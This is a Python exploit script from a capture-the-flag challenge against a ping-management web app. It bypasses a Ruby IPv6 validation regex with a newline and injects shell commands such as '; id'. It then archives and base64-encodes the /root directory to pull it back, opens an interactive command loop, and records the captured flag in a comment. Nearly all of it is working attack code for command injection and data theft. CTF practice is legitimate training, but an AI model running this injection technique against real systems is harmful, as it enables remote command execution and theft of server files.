#!/usr/bin/env python
import requests
import re
import IPython

#url = 'http://ping-management.marcusmadisonbakery.ctf/'
url = 'http://ping-management.marcusmadisonbakery.ctf:3003/ping'

def poke(ip):
    s = requests.session()
    r1 = s.get(url)
    auth = re.findall('id="authenticity_token" value="([^"]*)" />', r1.text)[0]
    r2 = s.post(url, data={'ip': ip, 'authenticity_token': auth})
    print(r2.text)
    return (s,r1,r2)

#poke('::\0')
#s = "0:"*6+"255"+".d"+".d"+".d"
#megaregex = '^ *((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]d|1dd|[1-9]?d)(.(25[0-5]|2[0-4]d|1dd|[1-9]?d)){3}))|:))) *$'
#print(repr(s))
#print(re.match(megaregex, s).span())
#poke(s)

'''
negasora suggested that the site looked like ruby
searching for "ruby regex bypass" found http://homakov.blogspot.ca/2012/05/saferweb-injects-in-various-ruby.html
Quote: ^ for start-of-string and $ for end-of-string ARE just new lines - \n!
'''
#poke('::\n; echo hello')
poke('; id\n::\n')
def shellcmd(s):
    return poke('; %s\n::\n' % (s,))[2].text

with open('pinghelper_files.tar.gz.base64.html', 'w') as f:
    shellcmd('tar cf /tmp/pinghelper_files.tar /root')
    shellcmd('gzip -9 /tmp/pinghelper_files.tar')
    f.write(shellcmd('base64 /tmp/pinghelper_files.tar.gz'))

#IPython.embed()
while True:
    shellcmd(raw_input())

'''
cat ../flag.txt
R3g3xAr3F0nz

tar cf /tmp/pinghelper_files.tar /root
gzip -9 /tmp/pinghelper_files.tar
base64 /tmp/pinghelper_files.tar.gz
'''
